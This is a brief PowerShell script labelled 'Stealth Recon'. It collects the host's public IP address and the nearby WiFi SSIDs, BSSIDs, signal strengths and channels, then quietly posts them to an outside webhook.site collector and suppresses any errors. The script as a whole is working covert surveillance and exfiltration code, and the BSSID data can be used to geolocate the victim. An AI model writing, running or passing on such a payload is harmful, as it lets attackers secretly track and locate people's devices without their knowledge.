# === Stealth Recon - Plain Text (Simplest) ===

$ip = irm https://api.ipify.org
$wifi = netsh wlan show networks mode=bssid | Select-String "SSID|BSSID|Signal|Channel" -Context 0,2

$cleanData = "Public IP: $ip`n`n=== Relevant WiFi Data for Location ===`n$($wifi -join "`n")"

$catcherUrl = "https://webhook.site/0c2777c2-743a-4862-9a2d-0a88a11e47b2"

try {
    Invoke-RestMethod -Uri $catcherUrl -Method Post -Body $cleanData -ContentType "text/plain" | Out-Null
} catch { }
